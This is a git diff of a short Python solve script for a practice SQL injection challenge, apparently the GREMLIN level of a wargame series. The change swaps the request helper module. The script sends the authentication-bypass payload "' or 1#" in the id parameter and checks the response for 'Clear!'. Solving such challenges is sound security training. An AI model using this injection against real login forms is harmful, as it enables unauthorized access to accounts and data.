@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import los
 import los_cookies
+from connect import my_request as req
 
 
 def main():
@@ -19,7 +20,7 @@ def main():
     cook = los_cookies.check_cookies(url)
 
     param = dict(id="' or 1#")
-    response = los.get_request(url, param, cook)
+    response = req.get_request(url, param, cook)
 
     if 'Clear!' in response:
         print('GREMLIN Clear!')
